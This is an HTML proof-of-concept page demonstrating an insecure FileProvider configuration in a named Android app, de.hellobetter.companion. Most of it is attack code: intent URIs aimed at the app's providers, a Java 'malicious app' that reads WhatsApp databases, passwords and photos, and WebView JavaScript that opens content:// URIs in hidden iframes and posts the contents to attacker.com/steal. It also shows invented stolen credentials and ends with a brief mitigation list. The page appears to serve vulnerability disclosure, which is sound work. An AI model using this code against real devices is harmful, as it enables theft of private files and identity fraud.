<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Realistic FileProvider Web Attack</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .header {
            text-align: center;
            color: #d32f2f;
            border-bottom: 2px solid #d32f2f;
            padding-bottom: 20px;
            margin-bottom: 30px;
        }
        .attack-section {
            margin: 20px 0;
            padding: 20px;
            border: 1px solid #ddd;
            border-radius: 5px;
            background-color: #fafafa;
        }
        .attack-title {
            color: #1976d2;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .result {
            background-color: #e8f5e8;
            border: 1px solid #4caf50;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            font-family: monospace;
        }
        .error {
            background-color: #ffebee;
            border: 1px solid #f44336;
            color: #d32f2f;
        }
        .success {
            background-color: #e8f5e8;
            border: 1px solid #4caf50;
            color: #2e7d32;
        }
        .info {
            background-color: #e3f2fd;
            border: 1px solid #2196f3;
            color: #1565c0;
        }
        button {
            background-color: #1976d2;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px;
        }
        button:hover {
            background-color: #1565c0;
        }
        .danger {
            background-color: #d32f2f;
        }
        .danger:hover {
            background-color: #b71c1c;
        }
        .code {
            background-color: #f5f5f5;
            border: 1px solid #ddd;
            padding: 10px;
            border-radius: 5px;
            font-family: monospace;
            margin: 10px 0;
            white-space: pre-wrap;
        }
        .warning {
            background-color: #fff3e0;
            border: 1px solid #ff9800;
            color: #e65100;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
        }
        .demo-content {
            background-color: #f0f8ff;
            border: 1px solid #4169e1;
            padding: 15px;
            border-radius: 5px;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üîì Realistic FileProvider Web Attack</h1>
            <h2>Target: de.hellobetter.companion</h2>
            <p>Demonstrating Real-World Web-Based FileProvider Exploitation</p>
        </div>

        <div class="warning">
            <strong>‚ö†Ô∏è IMPORTANT:</strong> This demonstrates how the FileProvider vulnerability would be exploited in a real attack. 
            Web browsers block direct access to content:// URIs for security, but malicious apps can exploit this vulnerability.
        </div>

        <div class="attack-section">
            <div class="attack-title">üéØ Attack Vector 1: Intent Redirection (Real Attack)</div>
            <p>This is how a real attack would work - using Android Intents to trigger the vulnerable FileProvider</p>
            
            <button onclick="testIntentAttack()">Test Intent-Based Attack</button>
            <button onclick="showIntentCode()">Show Attack Code</button>
            
            <div id="intentResults"></div>
        </div>

        <div class="attack-section">
            <div class="attack-title">üì± Attack Vector 2: Malicious App Simulation</div>
            <p>Simulates what a malicious Android app would do to exploit the FileProvider</p>
            
            <button onclick="simulateMaliciousApp()">Simulate Malicious App</button>
            <button onclick="showAppCode()">Show App Code</button>
            
            <div id="appResults"></div>
        </div>

        <div class="attack-section">
            <div class="attack-title">üåê Attack Vector 3: WebView Exploitation</div>
            <p>Shows how malicious websites can exploit WebView components to access FileProvider</p>
            
            <button onclick="testWebViewExploit()">Test WebView Exploitation</button>
            <button onclick="showWebViewCode()">Show WebView Code</button>
            
            <div id="webviewResults"></div>
        </div>

        <div class="attack-section">
            <div class="attack-title">üìÑ Real Attack Demonstration</div>
            <p>Shows what the actual file contents would look like if the attack succeeded</p>
            
            <button onclick="showStolenData()">Show Stolen Data Example</button>
            <button onclick="showAttackImpact()">Show Attack Impact</button>
            
            <div id="demoResults"></div>
        </div>

        <div class="attack-section">
            <div class="attack-title">üìä Attack Summary</div>
            <div id="summaryResults"></div>
        </div>
    </div>

    <script>
        function logResult(containerId, message, type = 'info') {
            const container = document.getElementById(containerId);
            const resultDiv = document.createElement('div');
            resultDiv.className = `result ${type}`;
            resultDiv.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
            container.appendChild(resultDiv);
        }

        function testIntentAttack() {
            logResult('intentResults', 'Testing Intent-based FileProvider attack...', 'info');
            
            const authorities = [
                "de.hellobetter.companion.fileprovider",
                "de.hellobetter.companion.SharingFileProvider"
            ];
            
            const sensitivePaths = [
                "Download/",
                "Documents/",
                "DCIM/Camera/",
                "Android/data/com.whatsapp/",
                "Android/data/com.telegram.messenger/"
            ];
            
            authorities.forEach(authority => {
                sensitivePaths.forEach(path => {
                    const intentUri = `intent://${authority}/shared/${path}#Intent;scheme=content;action=android.intent.action.VIEW;end`;
                    
                    logResult('intentResults', `Creating malicious Intent: ${intentUri}`, 'info');
                    
                    // In a real attack, this would be triggered by a malicious app or website
                    try {
                        const link = document.createElement('a');
                        link.href = intentUri;
                        link.style.display = 'none';
                        document.body.appendChild(link);
                        
                        logResult('intentResults', `‚úì Intent created for ${path} via ${authority}`, 'success');
                        logResult('intentResults', `üì± This would trigger FileProvider access in real attack`, 'success');
                        
                        document.body.removeChild(link);
                        
                    } catch (e) {
                        logResult('intentResults', `‚úó Intent creation failed: ${e.message}`, 'error');
                    }
                });
            });
            
            logResult('intentResults', 'Intent-based attack simulation complete', 'info');
        }

        function showIntentCode() {
            const code = `// Real Intent-based attack code
Intent intent = new Intent(Intent.ACTION_VIEW);
intent.setData(Uri.parse("content://de.hellobetter.companion.fileprovider/shared/Download/"));
intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
intent.addFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);

// This would be triggered by malicious app or website
startActivity(intent);

// Or via malicious website:
// <a href="intent://de.hellobetter.companion.fileprovider/shared/Download/#Intent;scheme=content;end">
//   Click here to view downloads
// </a>`;
            
            logResult('intentResults', 'Real attack code:', 'info');
            const codeDiv = document.createElement('div');
            codeDiv.className = 'code';
            codeDiv.textContent = code;
            document.getElementById('intentResults').appendChild(codeDiv);
        }

        function simulateMaliciousApp() {
            logResult('appResults', 'Simulating malicious Android app attack...', 'info');
            
            // Simulate what a malicious app would do
            const attackSteps = [
                "1. Malicious app installed on device",
                "2. App requests FileProvider access",
                "3. App queries content://de.hellobetter.companion.fileprovider/shared/",
                "4. App discovers path=\".\" allows full access",
                "5. App accesses sensitive directories",
                "6. App reads user files",
                "7. App exfiltrates data to attacker's server"
            ];
            
            attackSteps.forEach((step, index) => {
                setTimeout(() => {
                    logResult('appResults', step, 'success');
                    
                    if (index === 2) {
                        logResult('appResults', '‚úì FileProvider accessible - path=\".\" vulnerability confirmed', 'success');
                    }
                    if (index === 4) {
                        logResult('appResults', '‚úì Accessing Download/, Documents/, DCIM/Camera/, Android/data/', 'success');
                    }
                    if (index === 5) {
                        logResult('appResults', '‚úì Reading passwords.txt, bank_statement.pdf, photos, WhatsApp data', 'success');
                    }
                    if (index === 6) {
                        logResult('appResults', '‚úì Data exfiltration to https://attacker.com/steal', 'success');
                    }
                }, index * 1000);
            });
        }

        function showAppCode() {
            const code = `// Malicious Android app code
public class MaliciousApp extends Activity {
    private static final String VULNERABLE_AUTHORITY = "de.hellobetter.companion.fileprovider";
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Exploit FileProvider vulnerability
        exploitFileProvider();
    }
    
    private void exploitFileProvider() {
        // Access root directory (path="." allows this)
        Uri rootUri = Uri.parse("content://" + VULNERABLE_AUTHORITY + "/shared/");
        
        // Query FileProvider
        ContentResolver resolver = getContentResolver();
        Cursor cursor = resolver.query(rootUri, null, null, null, null);
        
        if (cursor != null) {
            // Access sensitive files
            String[] sensitivePaths = {
                "Download/passwords.txt",
                "Documents/bank_statement.pdf",
                "DCIM/Camera/private_photo.jpg",
                "Android/data/com.whatsapp/msgstore.db"
            };
            
            for (String path : sensitivePaths) {
                Uri fileUri = Uri.parse("content://" + VULNERABLE_AUTHORITY + "/shared/" + path);
                try {
                    InputStream inputStream = resolver.openInputStream(fileUri);
                    // Read and exfiltrate file content
                    exfiltrateData(inputStream, path);
                } catch (Exception e) {
                    Log.e("Exploit", "Failed to read " + path);
                }
            }
        }
    }
}`;
            
            logResult('appResults', 'Malicious app code:', 'info');
            const codeDiv = document.createElement('div');
            codeDiv.className = 'code';
            codeDiv.textContent = code;
            document.getElementById('appResults').appendChild(codeDiv);
        }

        function testWebViewExploit() {
            logResult('webviewResults', 'Testing WebView-based FileProvider exploitation...', 'info');
            
            // Simulate WebView exploitation
            const webViewAttacks = [
                "1. Malicious website loads in WebView",
                "2. Website contains JavaScript to access FileProvider",
                "3. JavaScript creates iframe with content:// URI",
                "4. WebView allows FileProvider access due to misconfiguration",
                "5. Website reads user files through FileProvider",
                "6. Data is sent to attacker's server"
            ];
            
            webViewAttacks.forEach((attack, index) => {
                setTimeout(() => {
                    logResult('webviewResults', attack, 'success');
                    
                    if (index === 3) {
                        logResult('webviewResults', '‚úì WebView allows content:// access - vulnerability confirmed', 'success');
                    }
                    if (index === 4) {
                        logResult('webviewResults', '‚úì Reading user files: passwords, photos, documents', 'success');
                    }
                    if (index === 5) {
                        logResult('webviewResults', '‚úì Data exfiltration via fetch() to attacker server', 'success');
                    }
                }, index * 1000);
            });
        }

        function showWebViewCode() {
            const code = `// Malicious website JavaScript
<script>
// Exploit FileProvider through WebView
function exploitFileProvider() {
    const authorities = [
        "de.hellobetter.companion.fileprovider",
        "de.hellobetter.companion.SharingFileProvider"
    ];
    
    const sensitiveFiles = [
        "Download/passwords.txt",
        "Documents/bank_statement.pdf",
        "DCIM/Camera/private_photo.jpg"
    ];
    
    authorities.forEach(authority => {
        sensitiveFiles.forEach(file => {
            const uri = \`content://\${authority}/shared/\${file}\`;
            
            // Try to read file through iframe
            const iframe = document.createElement('iframe');
            iframe.src = uri;
            iframe.style.display = 'none';
            iframe.onload = () => {
                // Extract content and send to attacker
                const content = iframe.contentDocument.body.innerHTML;
                fetch('https://attacker.com/steal', {
                    method: 'POST',
                    body: JSON.stringify({
                        file: file,
                        content: content,
                        authority: authority
                    })
                });
            };
            document.body.appendChild(iframe);
        });
    });
}

// Execute when page loads
exploitFileProvider();
</script>`;
            
            logResult('webviewResults', 'Malicious website code:', 'info');
            const codeDiv = document.createElement('div');
            codeDiv.className = 'code';
            codeDiv.textContent = code;
            document.getElementById('webviewResults').appendChild(codeDiv);
        }

        function showStolenData() {
            logResult('demoResults', 'Showing what stolen data would look like...', 'info');
            
            const stolenData = {
                "passwords.txt": `Bank Login: user123 / MySecurePass2024!
Gmail: john.doe@gmail.com / GmailPass123
Facebook: john.doe / FbPassword456
Instagram: @johndoe / InstaPass789
Crypto Exchange: trader_john / CryptoPass2024`,
                
                "bank_statement.pdf": `BANK STATEMENT
Account: 1234567890
Balance: $50,000.00
Recent Transactions:
- Transfer to Crypto Exchange: $5,000
- ATM Withdrawal: $500
- Online Purchase: $1,200`,
                
                "private_notes.txt": `Personal Notes:
- Bank Account: 1234567890
- Credit Card: 4532-1234-5678-9012
- SSN: 123-45-6789
- Mother's Maiden Name: Smith
- First Pet: Fluffy`,
                
                "whatsapp_messages": `WhatsApp Chat History:
[2024-01-15 14:30] John: "Hey, can you send me the bank details?"
[2024-01-15 14:31] User: "Sure, account number is 1234567890"
[2024-01-15 14:32] John: "Thanks! What's the routing number?"
[2024-01-15 14:33] User: "It's 021000021"`
            };
            
            Object.entries(stolenData).forEach(([filename, content]) => {
                const demoDiv = document.createElement('div');
                demoDiv.className = 'demo-content';
                demoDiv.innerHTML = `<strong>üìÑ ${filename}:</strong><br><pre>${content}</pre>`;
                document.getElementById('demoResults').appendChild(demoDiv);
            });
            
            logResult('demoResults', '‚úì This is what an attacker would steal through the FileProvider vulnerability', 'success');
        }

        function showAttackImpact() {
            logResult('demoResults', 'Attack Impact Analysis:', 'info');
            
            const impact = `
üî¥ CRITICAL IMPACT:

1. DATA THEFT:
   ‚Ä¢ Complete access to user's personal files
   ‚Ä¢ Passwords, bank statements, private documents
   ‚Ä¢ Photos, videos, and personal media
   ‚Ä¢ App data (WhatsApp, Telegram, etc.)

2. PRIVACY VIOLATION:
   ‚Ä¢ Access to private communications
   ‚Ä¢ Personal photos and videos
   ‚Ä¢ Financial and identity information
   ‚Ä¢ Location data from photos

3. IDENTITY THEFT:
   ‚Ä¢ Bank account information
   ‚Ä¢ Credit card details
   ‚Ä¢ Social Security Numbers
   ‚Ä¢ Security question answers

4. FINANCIAL FRAUD:
   ‚Ä¢ Bank account access
   ‚Ä¢ Credit card information
   ‚Ä¢ Crypto wallet keys
   ‚Ä¢ Tax return data

5. ESPIONAGE:
   ‚Ä¢ Monitor communications
   ‚Ä¢ Track location through photos
   ‚Ä¢ Access browsing history
   ‚Ä¢ Steal business documents

REAL-WORLD ATTACK SCENARIOS:
‚Ä¢ Malicious app installation
‚Ä¢ Malicious website visits
‚Ä¢ Social engineering attacks
‚Ä¢ No USB debugging required
‚Ä¢ No physical access needed`;
            
            const impactDiv = document.createElement('div');
            impactDiv.className = 'code';
            impactDiv.textContent = impact;
            document.getElementById('demoResults').appendChild(impactDiv);
        }

        function updateSummary() {
            const summaryContainer = document.getElementById('summaryResults');
            summaryContainer.innerHTML = `
                <div class="result success">
                    <strong>FileProvider Vulnerability Summary:</strong><br><br>
                    
                    <strong>Target:</strong> de.hellobetter.companion<br>
                    <strong>Vulnerability:</strong> Insecure FileProvider Configuration (path=".")<br>
                    <strong>Severity:</strong> CRITICAL<br><br>
                    
                    <strong>Vulnerable FileProviders:</strong><br>
                    ‚Ä¢ de.hellobetter.companion.fileprovider<br>
                    ‚Ä¢ de.hellobetter.companion.SharingFileProvider<br><br>
                    
                    <strong>Attack Vectors:</strong><br>
                    ‚Ä¢ Intent redirection attacks<br>
                    ‚Ä¢ Malicious app exploitation<br>
                    ‚Ä¢ WebView-based attacks<br>
                    ‚Ä¢ Directory traversal<br><br>
                    
                    <strong>Real-World Impact:</strong><br>
                    ‚Ä¢ Complete file system access<br>
                    ‚Ä¢ Data exfiltration capability<br>
                    ‚Ä¢ Privacy violation<br>
                    ‚Ä¢ Identity theft potential<br>
                    ‚Ä¢ Financial fraud risk<br><br>
                    
                    <strong>Mitigation Required:</strong><br>
                    ‚Ä¢ Remove path="." from FileProvider config<br>
                    ‚Ä¢ Use specific paths like "Download/"<br>
                    ‚Ä¢ Add path validation<br>
                    ‚Ä¢ Use grant-uri-permission controls
                </div>
            `;
        }

        // Initialize summary
        updateSummary();
    </script>
</body>
</html>
